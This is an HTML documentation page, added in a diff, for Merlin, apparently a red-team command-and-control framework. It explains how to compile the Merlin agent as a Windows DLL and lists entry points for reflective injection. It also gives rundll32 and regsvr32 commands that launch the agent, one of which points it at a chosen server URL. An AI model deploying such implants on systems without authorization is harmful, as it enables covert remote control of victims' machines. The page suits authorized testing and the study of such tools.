@@ -1,0 +1,248 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>DLL Agent &#8212; Merlin BETA documentation</title>
+    <link rel="stylesheet" href="../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <script type="text/javascript" src="../_static/language_data.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="PowerShell" href="powershell.html" />
+    <link rel="prev" title="Command Line Flags" href="cli.html" />
+   
+  <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          
+
+          <div class="body" role="main">
+            
+  <div class="section" id="dll-agent">
+<h1>DLL Agent<a class="headerlink" href="#dll-agent" title="Permalink to this headline">¶</a></h1>
+<p>Merlin can be compiled into a DLL. The <code class="docutils literal notranslate"><span class="pre">data/bin/dll/merlin.c</span></code> file is a very simple C file with a single function. The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> and <code class="docutils literal notranslate"><span class="pre">Run</span></code>
+functions are exported to facilitate executing the DLL.</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> function name was specifically chosen to facilitate use with PowerSploit’s
+<a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection.ps1</a>.
+Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> requires no modification to run Merlin’s DLL with Invoke-ReflectivePEInjection.</p>
+<p>If the DLL is compiled on Windows, the <a class="reference external" href="http://tdm-gcc.tdragon.net/download">TDM-GCC</a> 64bit compiler has proven to work well during testing.</p>
+<p>If the DLL is compiled on Linux, ensure <code class="docutils literal notranslate"><span class="pre">MinGW-w64</span></code> is installed.</p>
+<div class="section" id="creating-the-dll">
+<h2>Creating the DLL<a class="headerlink" href="#creating-the-dll" title="Permalink to this headline">¶</a></h2>
+<p>The DLL can be created using the Make file with <code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">agent-dll</span></code></p>
+<p>Alternatively, it can be compiled without Make by following these steps:</p>
+<ul class="simple">
+<li><dl class="first docutils">
+<dt>Create the required C archive file:</dt>
+<dd><code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">data/bin/dll;go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">../../../cmd/merlinagentdll/main.go</span></code></dd>
+</dl>
+</li>
+<li><dl class="first docutils">
+<dt>Compile the DLL</dt>
+<dd><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-shared</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">merlin.dll</span> <span class="pre">merlin.c</span> <span class="pre">main.a</span> <span class="pre">-lwinmm</span> <span class="pre">-lntdll</span> <span class="pre">-lws2_32</span></code></dd>
+</dl>
+</li>
+</ul>
+<p>You will now have DLL file that you can use with whatever method of execution you would like.</p>
+</div>
+<div class="section" id="dll-entry-points">
+<h2>DLL Entry Points<a class="headerlink" href="#dll-entry-points" title="Permalink to this headline">¶</a></h2>
+<p>This table catalogs the exported functions for <code class="docutils literal notranslate"><span class="pre">merlin.dll</span></code> that can be used as an entry point when executing the DLL.</p>
+<table border="1" class="colwidths-auto docutils" id="id1">
+<caption><span class="caption-text">Exported DLL Functions</span><a class="headerlink" href="#id1" title="Permalink to this table">¶</a></caption>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Exported Function</th>
+<th class="head">Status</th>
+<th class="head">Notes</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>Run</td>
+<td>Working</td>
+<td>Main function to execute Merlin agent</td>
+</tr>
+<tr class="row-odd"><td>DllInstall</td>
+<td>Partial</td>
+<td>Used with regsvr32.exe /i . Handling for <code class="docutils literal notranslate"><span class="pre">/i</span></code> not implemented</td>
+</tr>
+<tr class="row-even"><td>DllRegisterServer</td>
+<td>Working</td>
+<td>Used with regsvr32.exe</td>
+</tr>
+<tr class="row-odd"><td>DllUnregisterServer</td>
+<td>Working</td>
+<td>Used with regsvr32.exe /u</td>
+</tr>
+<tr class="row-even"><td>ReflectiveLoader</td>
+<td>Removed</td>
+<td>Used with Metasploit’s windows/manage/reflective_dll_inject module</td>
+</tr>
+<tr class="row-odd"><td>Magic</td>
+<td>Working</td>
+<td>Exported function in <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code>; used with sRDI or any other method</td>
+</tr>
+<tr class="row-even"><td>Merlin</td>
+<td>Working</td>
+<td>Exported function in <code class="docutils literal notranslate"><span class="pre">main.go</span></code></td>
+</tr>
+<tr class="row-odd"><td>VoidFunc</td>
+<td>Working</td>
+<td>Used with PowerSploit’s Invoke-ReflectivePEInjection.ps1</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="section" id="execution-with-rundll32-exe">
+<h2>Execution with rundll32.exe<a class="headerlink" href="#execution-with-rundll32-exe" title="Permalink to this headline">¶</a></h2>
+<p>The DLL can be executed on a Windows host using the rundll32.exe program. Examples of using <code class="docutils literal notranslate"><span class="pre">rundll32</span></code> are:</p>
+<ul class="simple">
+<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Merlin</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Magic</span></code></li>
+</ul>
+<p>A different Merlin server <em>can</em> be provided when executing the DLL by supplying the target URL as an argument. An example is:</p>
+<p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span> <span class="pre">https://yourdomian.com:443/</span></code></p>
+<p><strong>NOTE:</strong> Passing a custom URL only works when using cmd.exe and fails when using powershell.exe</p>
+</div>
+<div class="section" id="invoke-merlin">
+<h2>Invoke-Merlin<a class="headerlink" href="#invoke-merlin" title="Permalink to this headline">¶</a></h2>
+<p>The compiled DLL can be inserted into the <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin.ps1</span></code> script.
+Check the [README](../powershell/README.MD) in the <cite>powershell</cite> directory for
+additional details.</p>
+</div>
+<div class="section" id="limitations">
+<h2>Limitations<a class="headerlink" href="#limitations" title="Permalink to this headline">¶</a></h2>
+<p>It is important to note that the DLL is currently in the
+Proof-of-Concept stage. Because of this, there is no way to provide a
+different Merlin server URL when calling <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin</span></code>.</p>
+<p><code class="docutils literal notranslate"><span class="pre">Invoke-Merlin</span></code> will only call back to the Merlin server at
+127.0.0.1. because that is the hard coded value. Future work will
+facilitate specifying the value at compile time or when executing the
+script. Work is in progress to overcome this issue.</p>
+<p>One option to overcome this is to hard-code in the target Merlin server
+address into the <code class="docutils literal notranslate"><span class="pre">url</span></code> variable of the <code class="docutils literal notranslate"><span class="pre">cmd/merlinagent/main.go</span></code> prior
+to creating the C archive file.</p>
+</div>
+</div>
+
+
+          </div>
+          
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+<h1 class="logo"><a href="../index.html">Merlin</a></h1>
+
+
+
+
+
+
+
+
+<h3>Navigation</h3>
+<p class="caption"><span class="caption-text">Quick Start</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/server.html">Merlin Server</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/agent.html">Merlin Agent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/faq.html">FAQ</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Agent</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="cli.html">Command Line Flags</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">DLL Agent</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#creating-the-dll">Creating the DLL</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#dll-entry-points">DLL Entry Points</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#execution-with-rundll32-exe">Execution with rundll32.exe</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#invoke-merlin">Invoke-Merlin</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#limitations">Limitations</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="powershell.html">PowerShell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="custom.html">Custom Build</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Server</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/listeners.html">Listener Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Modules</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Misc.</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/logging.html">Logging</a></li>
+</ul>
+
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../index.html">Documentation overview</a><ul>
+      <li>Previous: <a href="cli.html" title="previous chapter">Command Line Flags</a></li>
+      <li>Next: <a href="powershell.html" title="next chapter">PowerShell</a></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+
+
+
+
+
+
+
+
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2020, Russel Van Tuyl (@Ne0nd0g).
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.8.5</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.12</a>
+      
+      |
+      <a href="../_sources/agent/dll.rst.txt"
+          rel="nofollow">Page source</a>
+    </div>
+
+    
+
+    
+  </body>
+</html>
